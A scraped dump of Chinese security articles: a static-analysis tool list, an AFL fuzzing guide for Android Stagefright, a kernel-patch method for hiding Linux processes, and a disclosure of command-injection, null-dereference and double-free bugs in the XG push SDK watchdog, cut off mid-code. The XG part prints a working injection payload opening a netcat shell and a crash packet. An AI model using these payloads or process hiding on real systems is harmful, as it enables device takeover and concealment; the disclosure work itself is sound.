一款专注于教学以及代码相容性的静态代码分析工具Godingo-hunter [OSS] – 用于在Go程序中找出deadlocks的静态分析器flen [OSS] – 在Go程序包中获取函数长度信息go/ast [OSS] – Package ast声明了关于Go程序包用于表示语法树的类型gocyclo [OSS] – 在Go源代码中测算cyclomatic函数复杂性Go Meta Linter [OSS] – 同时Go lint工具且工具的输出标准化go vet [OSS] – 检测Go源代码并报告可疑的构造ineffassign – 在Go代码中检测无效赋值safesql [OSS] – Golang静态分析工具，防止SQL注入GroovyCodeNarc [OSS] – 一款Groovy源代码静态分析工具, 授权检验和执行大多数编码编著以及最佳实践。HaskellHLint [OSS] – HLint是一款提高Haskell代码质量的工具HTMLHTMLHint [OSS] – HTML静态代码分析工具HTML Inspector [OSS] – HTML Inspector是一款代码质量工具，用以帮助你的团队写出更好的代码Javacheckstyle [OSS] – 检测Java源代码以坚持一个代码标准或者一组验证规则(最佳实践)ckjm [OSS] – 通过处理编译好的Java文件的字节码来计算Chidamber和Kemerer面向对象度量工具Error-prone [OSS] – 随着编译时错误信息捕获Java常见的错误fb-contrib [OSS] – FindBugs的一个插件，支持额外的bug检测Findbugs [OSS] – FindBugs是一个从Java程序中找到bugs的工具，它的查找模式可能存在误差find-sec-bugs [OSS] – IDE/Sonarcube插件用于Java web应用程序的安全审计HuntBugs [OSS] – 基于Procyon编译工具的字节码静态分析器，旨在取代FindBugs.PMD [OSS] – Java源代码分析器JavaScriptaether [OSS] – 程序集, 分析, 标准化, 重构, 沙盒, 运行, 单步调试, 以及可视化ClosureLinter [OSS] – 确保你项目的所有JavaScript代码遵循Google Javascript样式指南，同时他还可以自动修复许多常见错误complexity-report [OSS] – 针对JavaScript项目的软件复杂性分析escomplex [OSS] – 针对JavaScript系的抽象语法树软件复杂性分析eslint [OSS] – 在Javascript代码中对模式进行识别及报告Esprima [OSS] – ECMAScript解析标准，支持多用途分析quality [OSS] – 零配置代码和模块化程序集jshint [OSS] – 检测JavaScript代码中的错误及潜在问题，并执行你的团队约定好的编码方式。JSLint [PROPRIETARY] – JavaScript代码质量工具plato [OSS] – JavaScript可视化源代码复杂度yardstick [OSS] – Javascript代码度量工具XO [OSS] – 执行严格的代码风格.Lualuacheck [OSS] – Lua代码静态分析工具Makefileportlint [OSS] – FreeBSD及DragonFlyBSD端口目录验证器Packageslintian[OSS] – Debian程序包静态分析工具PerlPerl::Critic [OSS] – Perl源代码最佳实践PHPDesignPatternDetector [OSS] – 在PHP代码中检测设计模式deptrac [OSS] – 在软件层之间执行依赖规则exakat [OSS] – PHP自动化代码审查引擎GrumPHP [OSS] – 检测每次提交的代码phan [OSS] – 来自etsy的现代化静态分析器php7cc [OSS] – PHP 7 兼容性检查器php7mar [OSS] – 帮助开发者快速将代码移植到PHP 7phpcpd [OSS] – 针对PHP代码的复制/粘贴检测工具.PHP_CodeSniffer [OSS] – 检测违反定义的编码标准phpdcd [OSS] – 针对PHP代码的无作用代码检测工具PhpDependencyAnalysis [OSS] – 为项目创建一个依赖关系图标Php Inspections (EA Extended) [OSS] – PHP静态代码分析工具phpsa [OSS] – PHP静态分析工具PHPMD [OSS] – 在你的代码中寻找可能出现的bugPhpMetrics [OSS] – 预测代码的复杂性度量PHPQA [OSS] – 一款用于运行QA工具(phploc, phpcpd, phpcs, pdepend, phpmd, phpmetrics)的工具PHP Refactoring Browser [OSS] – 重构助手PHP-Token-Reflection [OSS] – 函数库模拟PHP内部反射PHP-Parser [OSS] – PHP写的一款PHP解析器RIPS [OSS] – 一款用于PHP脚本漏洞的静态源代码分析工具Tuli [OSS] – 静态分析引擎Pythonbandit [OSS] – 在Python代码中寻找常见安全问题的工具jedi [OSS] – Python自动化/静态分析函数库mccabe [OSS] – 检测McCabe复杂性mypy [OSS] – Python静态类型分析工具，旨在结合动态类型及静态类型的优点py-find-injection [OSS] – 从Python代码中寻找SQL注入漏洞pycodestyle [OSS] – (formerly pep8) Python风格检查工具pydocstyle [OSS] – Python docstring风格检查工具pyflakes [OSS] – 检测Python源文件中的错误pylint [OSS] – 寻找程序错误, 有助于执行编码标准以及嗅探代码异味. 此外它还包括pyreverse (UML图表生成器)以及symilar (一个类似的检测工具). 以及可选的扩展pyroma [OSS] – 评估Python项目，并列出问题帮助提高代码质量vulture [OSS] – 寻找Python代码中未使用的类,函数，变量xenon [OSS] – 使用radon监控代码复杂度Rlintr [PROPRIETARY] – R静态代码分析工具Rubybrakeman [OSS] – Ruby on Rails应用的一个静态分析安全漏洞扫描工具cane [OSS] – 代码质量标准检查dawnscanner [OSS] – ruby写的静态分析安全扫描器，支持Sinatra, Padrino以及Ruby on Rails框架flay [OSS] – Flay 分析代码结构相似之处flog [OSS] – Flog在一个易于阅读的报告中点出大多数不合规则的代码，评价分数越高，代码就越糟糕laser [OSS] – Ruby代码的风格小工具集和静态分析工具Mondrian [OSS] – 静态分析及重构工具pelusa [OSS] – 静态分析Lint-type工具用以改善你的Ruby面向对象代码quality [OSS] – 使用社区工具在你的代码中运行质量检测reek [OSS] – Ruby代码异味检测工具rubocop [OSS] – Ruby静态代码分析工具, 基于Ruby社区风格指南rubycritic [OSS] – Ruby代码质量报告工具ruby-lint [OSS] – Ruby静态代码分析工具SandyMeter [OSS] – 用于检测遵循Sandi Metz规则的Ruby代码的静态分析工具Rustclippy [OSS] – 一个代码小工具集用于捕获常见错误，以及提高Rust代码质量electrolysis [OSS] – 验证Rust程序的工具herbie [OSS] – 当使用一个不稳定的浮点表达式时增加警告或者错误linter-rust [OSS] – Atom扩展，列出你的Rust文件。使用rustc和cargorustfix [OSS] – 读取和应用由rustc提出的建议Shellshellcheck [OSS] – ShellCheck, 一个精通分析工具，为bash/sh shell脚本提出警告和建议SQLsqlint [OSS] – 简单的SQL工具集SwiftSwiftLint [OSS] – 执行Swift编码风格和约定的工具Tailor [OSS] – 一个用Swift程序语言写的静态分析工具及源代码工具集","2016-11-16 14:09:07","安全工具","静态分析工具大集合","http://nsoad.com/Security-tools/20161116/tools-787.html"
"5ccbfada4f2f0a0a7a69c0d7","模糊测试是一种自动向程序传递输入数据并监控其输出的自动化测试技术。通过这种技术，安全人员可以测试程序的可靠性以及识别潜在的安全漏洞。","ele7enxxh","前言模糊测试是一种自动向程序传递输入数据并监控其输出的自动化测试技术。通过这种技术，安全人员可以测试程序的可靠性以及识别潜在的安全漏洞。我们（360成都安全响应中心）将对Stagefright Media Framework进行模糊测试。它是Android系统上用于解析多媒体文件的逻辑算法库，其中包含了大量的安全漏洞，攻击者通过构造特殊的多媒体文件导致拒绝服务或特权升级甚至远程执行代码。我们将要使用的模糊测试工具为Michał Zalewski开发的一款最为流行的基于代码覆盖率的开源测试工具：AFL(American Fuzzy Lop)。 借助于其高效的策略，AFL已经在真实产品中发现了大量的漏洞。在本文中，我们将指导你如何在Linux上使用AFL对stagefright进行模糊测试，从而更高效的复现已知漏洞或发掘新漏洞。 另外，本文不仅适用于stagefright，其中的一些经验同样适用于其它由C/C++编写的Android本地程序。要求在本节中，我们将首先向你介绍本文接下来使用的环境要求以及软件版本。为了避免出现其他未遇见的错误，我们建议你和我们保持完全一致。操作系统：Ubuntu 16.10 64bit， 不建议使用32位系统；AFL版本：2.39b，最新的总是更好的；AOSP版本：7.1.1_r25，如果你使用的是其他版本，你可能无法直接使用补丁文件；llvm和clang版本：3.8。我们假设你已经完成了下载并且编译AOSP的工作。另外，如果你想要使用ASAN，我们建议你编译AOSP为x86版本。概述官方AFL只支持在Linux上进行模糊测试，而stagefright是在Android多媒体框架下工作的，因此我们无法直接使用AFL对stagefright进行模糊测试。为了解决这个问题，我们提出了下面两种方案。方案A：将AFL移植到Android上，从而在Android模拟器或者真实的Android设备上进行模糊测试；方案B：将stagefright移植到Linux上，从而直接使用官方AFL对其进行模糊测试。其中，我们已经实现了方案A–android-afl，并且公布了源代码，你可以从仓库得到更多信息。方案A的主要流程图如下图所示。方案B的主要流程图如下图所示。显而易见，相比于方案A，方案B更加简洁，其效率也更好（通常来说，PC的性能远高于任何Android手机或者Android模拟器）；另一方面，由于stagefright本身的复杂性，其实现也更加困难。在后续的文章中，我们将一步一步向你介绍如何实现方案B。通过它，我们已经发现了两个漏洞。CVE-2016-6764：mediaserver的拒绝服务漏洞；CVE-2016-6766：mediaserver的拒绝服务漏洞。细节移植stagefright到Linux显而易见，我们首先要让stagefright在Linux上正常工作。移植binder和ashmemstagefright需要通过ashmem驱动来共享内存，然而默认情况下Linux内核并不包含ashmem驱动。幸运的是，我们可以通过修改Linux内核配置，并重新编译安装新内核，从而激活ashmem驱动。我们也许还有更好的解决方案，例如：使用shm代替ashmem或者完全去掉ashmem相关的代码; 注意，本文并未使用binder驱动，这里移植binder只是顺便而已。使用以下命令下载内核源码。sudo apt install linux-source  转到你要保存内核源码的目录并提取压缩文件。$ cd kernel$ tar jxvf /usr/src/linux/linux-source-4.8.0.tar.bz2$ cd linux-source-4.8.0拷贝旧的.config文件到源码根目录并开始配置。$ cp -vi /boot/config-`uname -r` .config$ make oldconfig接着使用下面的命令来激活ashmem驱动。$ make menuconfig转到Device Drivers-&gt;Android，选中Andoid Drivers和Android Binder IPC Driver。转到Device Drivers-&gt;Staging drivers-&gt;Android，选中Enable the Anonymous Shared Memory Subsystem。现在你可以开始编译安装内核了，执行下面的命令。$ make -j16$ sudo make modules_install$ sudo make install你还需要配置udev规则，从而使得任何用户均可访问binder和ashmem。$ echo -e ""KERNEL==\""binder\"", MODE=\""0666\""\nKERNEL==\""ashmem\"", MODE=\""0666\"""" | sudo tee /etc/udev/rules.d/android.rules最后，重启你的电脑以启用新内核。修改Stagefright源码注意，变量ANDROIDBUILDTOP为AOSP的根目录，ANDROIDPRODUCTOUT为AOSP的输出目录。在这一节，你需要对stagefright源码（包括libstagefright和 stagefright命令行工具）进行改动，原因主要为以下两点。平台性：stagefright使用了binder驱动进行进程间通信，然而默认情况下Linux内核并不包含binder驱动（实际上，我们可以通过修改Linux内核配置，并重新编译安装新内核，从而激活binder驱动）；依赖性：stagefright命令行工具无法独立的对多媒体文件进行解析，它依赖于其他服务进程（如：servicemanager，mediaserver等）。我们将不会阐述解决上诉两个问题的具体细节，你可以直接使用我们提供的适用于7.1.1_r25版本的补丁文件。如果你使用的版本和我们不同，你可能需要参照补丁文件，手动修改代码。点击这里下载补丁文件stagefright.diff，转到$ANDROIDBUILDTOP/aosp/master/frameworks/av目录并应用补丁。$ cd $ANDROID_BUILD_TOP/frameworks/av$ git apply stagefright.diff编译编译好x86版本的AOSP后，转到stagefright源码目录，并编译。$ cd $ANDROID_BUILD_TOP/frameworks/av/cmds/stagefright$ mm -j16编译结束后，你可以在$ANDROIDPRODUCTOUT/system/bin目录找到stagefright可执行程序。配置运行环境为了让系统能正确找到加载器以及依赖库的位置，你需要做以下软连接。$ sudo ln -s $ANDROID_PRODUCT_OUT/system /system拷贝解码器配置文件到/etc目录。$ sudo cp $ANDROID_PRODUCT_OUT/system/etc/media_codecs_google_audio.xml /etc$ sudo cp $ANDROID_PRODUCT_OUT/system/etc/media_codecs_google_telephony.xml /etc$ sudo cp $ANDROID_PRODUCT_OUT/system/etc/media_codecs_google_video.xml /etc$ sudo cp $ANDROID_PRODUCT_OUT/system/etc/media_codecs.xml /etc另外，如果需要在后续使用ASAN，你还需要做以下软连接。$ ln -s $ANDROID_PRODUCT_OUT/system/bin/linker $ANDROID_PRODUCT_OUT/system/bin/linker_asan$ ln -s $ANDROID_PRODUCT_OUT/obj/lib/libclang_rt.asan-i686-android.so $ANDROID_PRODUCT_OUT/system/lib/libclang_rt.asan-i686-android.so测试运行现在，你可以尝试在Linux上运行stagefright了。例如，解析一个MP4文件，运行结果如下。$ /system/bin/stagefright Disco.240p.mp4thumbnailTime: 0 us (0.00 secs)  AVC video profile 66 and level 13  format changed.  ...................$avg. 180.73 fps  avg. time to decode one buffer 5485.86 usecs  decoded a total of 304 frame(s).  很好，你已经完成了最为困难也最为重要的工作！移植AFL首先，你需要从官网下载最新的AFL源码并解压。$ wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz$ tar zxf afl-latest.tgz接着，对AFL源码进行修改以修复下面几个错误。error: undefined reference to '__fprintf_chk' error: undefined reference to 'shmat' error: undefined reference 'afl-area_prev'同样，我们直接给出适用于2.39b版本（此时的最新版本）的AFL的补丁文件。如果你使用的版本和我们不同，你可能需要参照补丁文件，手动修改代码。从这里下载补丁文件afl-2.39b.diff到你的电脑，转到AFL源码根目录并安装补丁。$ cd afl-2.39b$ patch -p2 &lt; afl-2.39b.diff使用以下命令编译安装AFL。$ make clean all$ cd llvm_mode$ EXTRA_CFLAGS=""-target i686--linux-android -U_FORTIFY_SOURCE"" make clean all$ cd ../$ sudo make install使用AFL和ASAN进行重编译首先，进入你想要进行模糊测试的模块目录。$ cd MODULE_PATH其次，在其Android.mk文件中添加以下代码。LOCAL_CLANG := true  export AFL_CC := /usr/bin/clang  LOCAL_CC := afl-clang-fast  export AFL_CXX := /usr/bin/clang++  LOCAL_CXX := afl-clang-fast++  注意，由于unsupported reloc这个错误，我们不推荐使用afl-gcc/afl-g++。另一方面，根据AFL官方的资料，afl-clang-fast/afl-clang-fast++也是更高效的。接着，如果你想使用ASAN，你需要添加下面一行代码LOCAL_SANITIZE := address  或者LOCAL_SANITIZE := integer  最后，重新编译stagefright。$ mm -j16对于复杂的模块来说，你需要重复上面步骤数次，以对多个感兴趣的模块进行插桩。例如，你也许想要对以下模块进行插桩。$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/omx$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/yuv$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/colorconversion$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/codecs/aacenc$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/matroska$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/filters$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/webm$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/mpeg2ts$ANDROID_BUILD_TOP/frameworks/av/media/libstagefright/id3…more…恭喜你，所有准备工作都已经完成了，让我们开始模糊测试吧！模糊测试首先，你需要为AFL创建两个目录，一个为in，用于存放预先准备的输入样本；另一个为out，用于存放AFL模糊测试过程中生产的一些有用信息以及自动生成的会让程序挂起或者崩溃的样本。$ mkdir in$ mkdir out$ cp -r testcase/* in其次，你需要以root用户修改/proc/sys/kernel/core_pattern，以修复Pipe at the beginning of ‘core_pattern’这个错误。$ sudo -s$ echo core &gt;/proc/sys/kernel/core_pattern接着，你还需要设置CPU的工作模式为performance，以此来提高AFL的效率。$ sudo -s$ cd /sys/devices/system/cpu$ echo performance | tee cpu*/cpufreq/scaling_governor如果使用了ASAN，你可能需要执行以下命令。$ export ASAN_OPTIONS=abort_on_error=1:detect_leaks=0:symbolize=0:allocator_may_return_null=1最后，执行以下命令开始模糊测试。$ afl-fuzz -m 4096 -t 10000 -i in -o out -- /system/bin/stagefright @@如果一切顺利，你将看到类似的AFL的工作屏幕。建议在这一节，我们将给你一些额外的建议，以帮助你更快的发现程序中的漏洞。使用尽可能小但覆盖全面的测试样本集；对于你想要进行模糊测试的模块，尽可能的编译为静态模块而不是动态模块；不要对你不敢兴趣的模块进行插桩；使用并行模糊测试（-M选项和-S选项），更多介绍请参考AFL源码目录中的 docs/parallel_fuzzing.txt；ASAN需要大量的内存，因此你应该提高-m选项的值。待办事项本文还有许多可以改进的地方，但是我们不会在stagefright花费过多的精力了。","2017-03-14 14:12:27","移动安全","在Linux上使用AFL对Stagefright进行模糊测试","http://nsoad.com/Article/MobileSecurity/20170314/1116.html"
"5ccbfada4f2f0a0a7a69c0d8","目标读者：系统安全爱好者阅读时长：约 7分钟本文概要：一种 Linux 中进程隐藏的思路、操作与步骤截图前置知识：最好对 Linux 下编译程序略知一二（文末有知识注解与扩展阅","Kong","目标读者：系统安全爱好者阅读时长：约 7分钟本文概要：一种 Linux 中进程隐藏的思路、操作与步骤截图前置知识：最好对 Linux 下编译程序略知一二（文末有知识注解与扩展阅读，最后奉上网易小风景）前言之前团队内技术交流时小伙伴分享的自建蜜罐深深的引起了我的兴趣，于是本人决定山寨一个类似的蜜罐把玩一番~但是摆在眼前的一个问题就是：一些监控进程需要运行在蜜罐中，一但“请君入罐”后被黑客察觉到这些奇奇怪怪的进程，就十分尴尬了所以当务之急是需要将这些监控进程隐藏起来，对Linux略知一二的楼主自然也就接受挑战啦。准备工作众所周知，Linux 操作系统天生自带一个虚拟分区 /proc，该分区下保存硬件信息、内核运行参数、系统状态信息等等，进程运行时的一些信息自然也就存在这个分区下。如上图所示，系统里运行的每一个进程都会在 /proc 分区下新建一个以自己 pid 命名的目录，并将本进程的参数存到该目录下。在该目录下我们可以通过修改  cgroup 文件暴力的将进程绑定在某个 CPU 上，也可以通过修改 cpuset 文件来优化进程在 NUMA 架构系统上的运行效率，还可以通过修改 oom_adj 文件让系统 OOM 机制永远高抬贵手。而 ps、top 这类查看进程的命令恰恰也就是在 /proc 分区下收集信息。换句话说，如果让 ps、top 命令选择性失明，也就能达到我们隐藏进程的目的了。初次尝试网上关于 Linux 隐藏进程的方式有很多，比如：1）强行将进程 pid 变为 0，这种方法存在破绽因此不予考虑。2）还有一种简单的方法：系统启动时会依据 /etc/fstab 文件内容来挂载分区，在 proc 分区挂载参数中加入 hidepid=2 参数后，登陆系统的用户只能查看到当前用户启动的进程的信息。也就是说， tomcat 用户只能看到属于 tomcat 用户进程的信息。这种方法也存在弊端，罐中的黑客只能看到有限的进程信息，可能就会产生会怀疑。而且如果再存在个最近流行的 tomcat 提权漏洞，那罐子的身份就会瞬间露馅。所以这种方式也不合适，究竟如何才能将我们的问题解决在系统最底层呢？“肝”起来对于 Linux 系统来说有着得天独厚的优势，我们可以从内核解决一切问题。可是楼主的 C语言 实在是捉急，不由得又开始在互联网上寻找巨人的肩膀。一篇相关的干货贴引起了我的注意 http://blog.csdn.net/billpig/article/details/6038330（文末有引用说明），这位作者的思路很明确，在内核中新增两个信号量，当进程向内核发出 hide 信号时，内核将不会为该进程在 /proc 目录下生成对应的目录，从而也就从底层铲除了进程的信息，即使黑客获得了 root 权限也无法通过常规手段察觉到蛛丝马迹。除此之外，新增的unhide信号作用恰好与 hide 信号相反。通过查阅 crux 官方文档发现，Demo 中使用的内核版本为 2.6.15。在include/asm-i386/unistd.h 文件中定义新信号量 294 和 295。系统在接收到我们新定义的 294 和 295 两个信号量之后需要调用对应的函数来做出相应的动作。在 kernel/sys.c 中我们实现 294 和 295 信号调用的函数。如下图所示，sys_hide 和 sys_unhide 两个函数主要功能是修改进程 hide 变量的值。proc 相关内核代码位于 fs/proc/base.c 中，在进程相关结构体中新声明变量hide，通过发送信号量来修改 hide 的值，最后在 base.c 文件 proc_pid_readdir 函数中将 hide 变量的值作为进程是否在 proc 文件系统中体现的依据。除此之外还有些零碎的步骤，查看上文中的原帖地址即可，不再赘述。踩坑新内核编译完成后本以为可以愉快的开始玩耍了，结果新内核根本无法启动。通过各种修改启动参数发现，内核报错 “kernel too old” ，这就很尴尬了。再次站在巨人的肩膀上发现，确实是因为 kernel too old 。之前缺乏编译老旧内核的经验，现在才知道原来 gcc 调用的 libc 不是完全向下兼容的，我们可以通过file /lib/libc-*.*.so 来查看当前 libc 能够编译的最低版本的内核，如下图所示 libc-2.5.so 可以编译最低到 2.6.9 版本的内核，如果编译内核版本低于 2.6.9 的话就会产生 kernel too old 的报错导致内核无法启动。综上，我们的 libc 版本不可太高，又因为 Demo 中修改的是 i386 架构的内核源码，所以我选择的实验环境为 CentOS 5.11 (32bit) 。后续至此，我们就可以成功安装并启动 2.6.15 版本内核了，然而事情并没有结束。系统供外部进程使用的信号量仅有如下 64 个。所以一般情况下我们的进程只能发出上图这 64 种信号，我们想要发出 294 和 295 号信号量就必须借助于与系统关系更密切的 C语言 程序完成。然后通过执行命令gcc hide.c -fPIC -shared -o hide.so 将 hide.c 编译为 hide.so 的动态链接库。以后我们如果有进程需要隐藏的话，只需要在代码里调用 hide.so 中的 hide 函数即可，同样 unhide 函数是他的逆过程。如下图所示，在 Python 中 import  ctypes ，使用它调用 hide.so 库即可实现当前 Python2.7 进程的隐藏与恢复。至此，已经实现了内核级别的进程隐藏，可以愉快地做一些想做而又怕被别人发现的事情了…Linux下编译内核就跟Windows编译程序是一样的思路，Windows 下程序编译之后是一个可执行的文件，Linux下呢，编译内核的时候，一般也是从Git上把代码拖下来，是一个代码工程，编译后，生成一个对应格式的文件，这个时候该文件在Linux下 就跟其他文件一样，就是一个普通的文件。如果你想要把编译的这个内核在当前的系统中启动起来的话，由于当前系统中已经有一个正在运行的内核了，一个思路是你可以设置Linux一个变量（类似于Windows的环境变量），将该变量指向这个新编译好的内核文件，然后这个时候再重启当前Linux系统，系统启动时会读取那个变量的值，然后启动新的内核。（实验的时候建议在虚拟机里操作哦）拓展阅读《linux 隐藏进程 – crux实现》发布日期：2010.11.26链接：http://blog.csdn.net/billpig/article/details/6038330《linux内核编译过程的最终总结版》发布日期：2012.12.18链接：http://blog.csdn.net/fjt19900921/article/details/8316481网易小风景 NO.1","2016-10-25 15:52:22","系统安全","Linux进程隐藏的一种实现思路","http://nsoad.com/Article/system/20161025/635.html"
"5ccbfae44f2f0a0a7a69c0d9","XG SDK是一个流行的Android app推送SDK，有不少流行Android app均在使用，本文分析的版本主要针对100001_work_weixin_1.0.0.apk所使用的版本。","kong","0x00 简介XG SDK是一个流行的Android app推送SDK，有不少流行Android app均在使用，本文分析的版本主要针对100001_work_weixin_1.0.0.apk所使用的版本。漏洞最初在2016年4月份的时候提交给了某云网站，厂商已经确认，但由于网站持续“升级”的缘故，不太可能公开细节了。后续漏洞也已经提交给了TSRC，时至现在，相关漏洞均已经完全修复，漏洞已经不影响使用该SDK的app了，因此本文决定对相关技术细节予以分享，并补充有关该漏洞后续的一些研究。0x01 漏洞分析XG SDK会周期性地启动一个libtpnsWatchdog.so的可执行文件，作为看门狗保活应用，并随机在55000~56000端口监听任意地址。 public static int getRandomPort() {        return XGWatchdog.getRandomInt(1000) + 55000;    }在我们实验手机上的监听端口为55362，启动进程为com.tencent.wework lib目录下的libtpnsWatchdog.so经过逆向分析，可发现这个开放端口支持一系列的文本命令，包括：“ver:”，获取版本号“debug:1”，打开调试“xgapplist:”,获取或设置使用XG sdk的app“tme:xxxx”，设置周期性启动服务的等待时间”exit2:”，退出例如，发送debug:1，可获得当前手机上使用XG的app列表及当前启动服务的等待时间等信息，可见，手机上有四个app使用了该推送sdk。echo -n “debug:1” |nc 192.168.8.187 55362当发送xgapplist:xxx，则可以设置当前使用XG的app。其中xxx的形式为 ,;,…接下来会通过fopen打开/data/data//lib目录来判断指定packagename的目录是否存在，如果存在，则会在后续使用该packagename，否则提示找不到该package。然后，程序会调用system通过am命令启动对应包内的XG组件，这里就使用了上面检查过的packagename.注意，上述两个system函数中的参数没有进行任何过滤。那么，我们结合上述两张图来看，如果恶意app满足能够设置一个存在且被XG Sdk可以访问的目录，目录名中嵌入执行的代码那么就可以实现命令注入。对于条件1，可以通过../../../../路径穿越的形式跳转到恶意app可控的目录；而对于条件2，则可以利用shell特性，在可控目录下建立猥琐的“ || #”目录实现。0x02 漏洞利用（1）模拟恶意app在/sdcard目录建立一个特殊（猥琐）的目录名，除了“/“字符外，其他字符均可用。于是我们有了了” &amp;&amp; nc -ll -p 6666 -e sh #”的目录，并在目录下存在子目录lib（2）通过xgapplist命令设置推送app如图，发送命令，echo -n ""xgapplist:com.tencent.wework/../../../../../../sdcard/ &amp;&amp; nc -ll -p 6666 -e sh #,2100078991;"" | nc -vv 192.168.8.187 55362  观察logcat可以发现设置成功（3）通过tme命令，使am命令周期性进行，进而触发后面的system函数，执行我们的反弹shell命令echo -n “tme:12345” | nc -v 192.168.8.187 55362  稍等片刻，观察logcat的打印信息后，可以尝试连接shell，成功连接u0_a113用户正好就是com.tencent.wework 下面就可以以com.tencent.wework的权限做任何事情了，比如访问私有目录、打开保护的activity、发广播等等。0x03 漏洞是否能够远程因为当时漏洞取名带有“远程”二字不够严谨，引发了厂商的争议。的确，从这个漏洞的成因来看，主要还是本地恶意app通过污染目录名，结合XG开放的端口，完成本地提权。但经瘦蛟舞的指点，可以考虑向受害者发送包含污染目录名的zip包（或者通过浏览器下载解压至/sdcard），然后结合XG监听端口的地址为任意地址，远程传入命令，进而实现远程命令执行，这种远程攻击相对难度较大，因为开放的端口为随机端口，攻击者也需要社工欺骗受害者接收zip包.0x04 空指针解引用远程拒绝服务当向XG监听端口发送xgapplist命令时，libtpnsWatchdog.so对后面的packagename和accid进行处理，但并没有检查“，”或“；“分割的字符串为空的情况，导致后面atoll函数去访问0地址的内存，造成空指针解引用crash。见如下代码：v1 = a1;    if ( a1 )  {    j_j_memset(xgapplist, 0, 0x200u);    first_app = j_j_strtok(v1, "";"");    v3 = 0;    v2 = first_app;    while ( 1 )    {      len_of_applist = v3;      if ( !v2 )        break;      v5 = j_j_strlen(v2);      v6 = v5 + 1;      v7 = (void *)j_operator new[](v5 + 1);      xgapplist[len_of_applist] = v7;      j_j_memcpy(v7, v2, v6);      v2 = j_j_strtok(0, "";"");      v3 = len_of_applist + 1;    }    for ( i = 0; i &lt; len_of_applist; ++i )    {      v8 = (char *)xgapplist[i];      if ( v8 )      {        package = j_j_strtok(v8, "","");        accid = j_j_strtok(0, "","");        v11 = accid;        v12 = j_j_atoll(accid); //null pointer dereference crash !!!!        v27 = v12;向55362端口发送一个最简单的数据包，echo -n ""xgapplist:A"" | nc -v 192.168.8.169 55362  使用logcat可观察到Oops：I/DEBUG   (  243): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***  I/DEBUG   (  243): Build fingerprint: 'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'  I/DEBUG   (  243): Revision: '11'  I/DEBUG   (  243): pid: 11774, tid: 11774, name: xg_watchdog  &gt;&gt;&gt; /data/data/com.tencent.wework/lib/libtpnsWatchdog.so &lt;&lt;&lt;  I/DEBUG   (  243): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000  I/DEBUG   (  243):     r0 4008a2d8  r1 40083d28  r2 ffffff78  r3 00000000  I/DEBUG   (  243):     r4 400165c6  r5 00000002  r6 0000000a  r7 00000000  I/DEBUG   (  243):     r8 400120d9  r9 00000000  sl 00000000  fp bed838ec  I/DEBUG   (  243):     ip 40018f68  sp bed7f6e8  lr 400125e5  pc 4006aab0  cpsr 000f0030  I/DEBUG   (  243):     d0  0000000000000000  d1  0000000000000000  I/DEBUG   (  243):     d2  0000000000000000  d3  0000000000000000  I/DEBUG   (  243):     d4  0000000000000000  d5  0000000000000000  I/DEBUG   (  243):     d6  0000000000000000  d7  0000000000000000  I/DEBUG   (  243):     d8  0000000000000000  d9  0000000000000000  I/DEBUG   (  243):     d10 0000000000000000  d11 0000000000000000  I/DEBUG   (  243):     d12 0000000000000000  d13 0000000000000000  I/DEBUG   (  243):     d14 0000000000000000  d15 0000000000000000  I/DEBUG   (  243):     d16 41db6820b9bcac08  d17 3f50624dd2f1a9fc  I/DEBUG   (  243):     d18 419908a090000000  d19 0000000000000000  I/DEBUG   (  243):     d20 0000000000000000  d21 0000000000000000  I/DEBUG   (  243):     d22 0000000000000000  d23 0000000000000000  I/DEBUG   (  243):     d24 0000000000000000  d25 0000000000000000  I/DEBUG   (  243):     d26 0000000000000000  d27 0000000000000000  I/DEBUG   (  243):     d28 0000000000000000  d29 0000000000000000  I/DEBUG   (  243):     d30 0000000000000000  d31 0000000000000000  I/DEBUG   (  243):     scr 00000010  I/DEBUG   (  243):  I/DEBUG   (  243): backtrace:  I/DEBUG   (  243):     #00  pc 0002aab0  /system/lib/libc.so (strtoimax+31)  I/DEBUG   (  243):     #01  pc 000015e1  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  243):     #02  pc 00002787  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  243):     #03  pc 0000124f  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  243):     #04  pc 0000e34b  /system/lib/libc.so (__libc_init+50)  I/DEBUG   (  243):     #05  pc 00001390  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  243):  0x05 double free内存破坏仍然观察xgapplist命令，程序接收socket端口传入的命令xgapplist:&lt;packagename&gt;,&lt;accid&gt;;&lt;packgename2&gt;,&lt;accid2&gt;;…;&lt;packagenamen&gt;,&lt;accidn&gt;; 时，程序会对上述命令进行解析，分配xgappinfo对象，并依次将不重复的xgappinfo（使用XG SDK的app的信息）对象存入全局数组xgappinfo_listxgappinfo占用16字节，为如下结构体struct xgappinfo {      long accid,    char* packgename,    int  status};如图再来看下下面这段程序逻辑，void __fastcall sub_40056574(char *a1)  {  ...  int i; // [sp+24h] [bp-2Ch]@4  unsigned __int64 v27; // [sp+28h] [bp-28h]@8  v1 = a1;  j_j_memset(dword_40060028, 0, 0x200u);  v2 = j_j_strtok(v1, "";"");  v3 = 0;  v4 = v2;  while ( 1 )  {    v25 = v3;    if ( !v4 )      break;    v5 = j_j_strlen(v4);    v6 = v5 + 1;    v7 = (void *)j_operator new[](v5 + 1);    dword_40060028[v25] = v7;    j_j_memcpy(v7, v4, v6);    v4 = j_j_strtok(0, "";"");    v3 = v25 + 1;  }  for ( i = 0; i &lt; v25; ++i )  {    v8 = (char *)dword_40060028[i];    if ( sub_4005651C(dword_40060028[i]) )    {      v9 = j_j_strtok(v8, "","");      v10 = j_j_strtok(0, "","");      v11 = v10;      v12 = j_j_atoll(v10);      v27 = v12;      if ( v12 &lt;= 